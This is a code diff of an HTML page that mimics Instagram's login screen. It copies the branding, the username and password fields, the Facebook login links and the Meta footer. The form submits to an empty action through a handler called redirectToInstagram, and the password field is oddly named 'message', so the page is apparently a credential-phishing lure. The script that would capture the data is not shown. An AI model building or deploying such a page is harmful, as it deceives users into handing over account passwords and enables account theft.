@@ -20,12 +20,13 @@
 </head>
 
 <body>
+
+
     <div class="container">
         <div class="box">
             <div class="heading"></div>
-
-            <!-- Corrected form tag placement -->
-            <form class="login-form" id="form">
+            
+            <form class="login-form" action="" method="post" onsubmit="redirectToInstagram(event)">
                 <div class="field">
                     <input id="username" type="text" name="username" placeholder="Phone number, username, or email" required />
                     <label for="username">Phone number, username, or email</label>
@@ -33,70 +34,118 @@
                 <div class="field">
                     <input id="message" type="password" name="message" placeholder="Password" required />
                     <label for="password">Password</label>
+                    <button type="button" id="show-password-btn">Show</button>
                 </div>
                 <button class="login-button" id="submit" type="submit" title="Login">Log In</button>
+                <div class="separator">
+                    <div class="line"></div>
+                    <p>OR</p>
+                    <div class="line"></div>
+                </div>
+                <div class="other">
+                    <button class="fb-login-btn" type="button" onclick="window.location.href='https://www.facebook.com/login.php/'">
+                        <i class="fa fa-facebook-official fb-icon"></i>
+                        <span>
+                            <img src="https://t3.gstatic.com/faviconV2?client=SOCIAL&type=FAVICON&fallback_opts=TYPE,SIZE,URL&url=https://www.facebook.com/&size=256" height="15" width="15" />
+                            &nbsp;<a href="https://www.facebook.com/login.php/">Log in with Facebook</a>
+                        </span>
+                    </button>
+                    <a class="forgot-password" href="https://www.instagram.com/accounts/password/reset/?__pwa=1">Forgot password?</a>
+                </div>
             </form>
-
-            <div class="separator">
-                <div class="line"></div>
-                <p>OR</p>
-                <div class="line"></div>
-            </div>
-            <div class="other">
-                <button class="fb-login-btn" type="button" onclick="window.location.href='https://www.facebook.com/login.php/'">
-                    <i class="fa fa-facebook-official fb-icon"></i>
-                    <span>
-                        <img src="https://t3.gstatic.com/faviconV2?client=SOCIAL&type=FAVICON&fallback_opts=TYPE,SIZE,URL&url=https://www.facebook.com/&size=256" height="15" width="15" />
-                        &nbsp;<a href="https://www.facebook.com/login.php/">Log in with Facebook</a>
-                    </span>
-                </button>
-                <a class="forgot-password" href="https://www.instagram.com/accounts/password/reset/?__pwa=1">Forgot password?</a>
-            </div>
+            
+           
+            
         </div>
-
         <div class="box">
             <p>Don't have an account? <a class="signup" href="#">Sign Up</a></p>
         </div>
     </div>
-
     <br>
     <div class="get">
-        Get the app.
+    Get the app.
     </div>
-
     <br>
     <div class="apps">
         <a href="https://play.google.com/store/apps/details?id=com.instagram.android&hl=en_IN">
-            <img src="https://i.ibb.co/ZTHhz0b/playstore.png" height="40" width="134">
-        </a>
-        <a href="https://apps.microsoft.com/detail/9nblggh5l9xt?hl=en-US&gl=US">
-            <img src="https://static.cdninstagram.com/rsrc.php/v4/yu/r/EHY6QnZYdNX.png" height="40" width="auto">
-        </a>
-    </div>
-
-    <br>
-    <div class="footer">
-        <footer>
-            <a href="https://about.meta.com/">About</a>
-            <a href="https://about.fb.com/news/">Blog</a>
-            <a href="https://www.metajobs.com/">Jobs</a>
-            <a href="https://www.meta.com/help/">Help</a>
-            <a href="https://developers.facebook.com/docs/">API</a>
-            <a href="https://www.meta.com/privacy/">Privacy</a>
-            <a href="https://www.meta.com/terms/">Terms</a>
-            <a href="https://www.meta.com/locations/">Locations</a>
-            <a href="https://www.instagram.com/lite/">Instagram Lite</a>
-            <a href="https://www.facebook.com/help/instagram/261704639352628">Contact Uploading & Non-Users</a>
-            <a href="https://www.meta.com/verified/">Meta-verified</a>
-        </footer>
-    </div>
-
-    <div class="copyright">
+        <img src="https://i.ibb.co/ZTHhz0b/playstore.png" height="40"
+            width="134"></a>&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;
+        <a href="https://apps.microsoft.com/detail/9nblggh5l9xt?hl=en-US&gl=US"> 
+        <img src="https://static.cdninstagram.com/rsrc.php/v4/yu/r/EHY6QnZYdNX.png" height="40" width="auto"></a>
+        </div>
         <br>
-        <select aria-label="Switch Display Language" class="Language">
-            <!-- Language options... -->
-        </select> © 2025 Instagram from Meta
-    </div>
+        <div class="footer">
+    <footer>
+        <a href="https://about.meta.com/">About</a> 
+        <a href="https://about.fb.com/news/">Blog</a> 
+        <a href="https://www.metajobs.com/">Jobs</a> 
+        <a href="https://www.meta.com/help/">Help</a> 
+        <a href="https://developers.facebook.com/docs/">API</a> 
+        <a href="https://www.meta.com/privacy/">Privacy</a> 
+        <a href="https://www.meta.com/terms/">Terms</a> 
+        <a href="https://www.meta.com/locations/">Locations</a> 
+        <a href="https://www.instagram.com/lite/">Instagram Lite</a> 
+        <a href="https://www.facebook.com/help/instagram/261704639352628">Contact Uploading & Non-Users</a> 
+         <a href="https://www.meta.com/verified/">Meta-verified</a>
+        
+    </footer>
+</div>
+<div class="copyright">
+    <br>    
+    <select aria-label="Switch Display Language" class="Language">
+        <option value="en">English</option>
+        <option value="af">Afrikaans</option>
+        <option value="cs">Čeština</option>
+        <option value="da">Dansk</option>
+        <option value="de">Deutsch</option>
+        <option value="el">Ελληνικά</option>
+        <option value="en-gb">English (UK)</option>
+        <option value="es">Español (España)</option>
+        <option value="es-la">Español</option>
+        <option value="fi">Suomi</option>
+        <option value="fr">Français</option>
+        <option value="id">Bahasa Indonesia</option>
+        <option value="it">Italiano</option>
+        <option value="ja">日本語</option>
+        <option value="ko">한국어</option>
+        <option value="ms">Bahasa Melayu</option>
+        <option value="nb">Norsk</option>
+        <option value="nl">Nederlands</option>
+        <option value="pl">Polski</option>
+        <option value="pt-br">Português (Brasil)</option>
+        <option value="pt">Português (Portugal)</option>
+        <option value="ru">Русский</option>
+        <option value="sv">Svenska</option>
+        <option value="th">ภาษาไทย</option>
+        <option value="tl">Filipino</option>
+        <option value="tr">Türkçe</option>
+        <option value="zh-cn">中文(简体)</option>
+        <option value="zh-tw">中文(台灣)</option>
+        <option value="bn">বাংলা</option>
+        <option value="gu">ગુજરાતી</option>
+        <option value="hi">हिन्दी</option>
+        <option value="hr">Hrvatski</option>
+        <option value="hu">Magyar</option>
+        <option value="kn">ಕನ್ನಡ</option>
+        <option value="ml">മലയാളം</option>
+        <option value="mr">मराठी</option>
+        <option value="ne">नेपाली</option>
+        <option value="pa">ਪੰਜਾਬੀ</option>
+        <option value="si">සිංහල</option>
+        <option value="sk">Slovenčina</option>
+        <option value="ta">தமிழ்</option>
+        <option value="te">తెలుగు</option>
+        <option value="vi">Tiếng Việt</option>
+        <option value="zh-hk">中文(香港)</option>
+        <option value="bg">Български</option>
+        <option value="fr-ca">Français (Canada)</option>
+        <option value="ro">Română</option>
+        <option value="sr">Српски</option>
+        <option value="uk">Українська</option>
+      </select> © 2025 Instagram from Meta
+</div>
+
+</body>
     <script src="script.js"></script>
 </body>
 
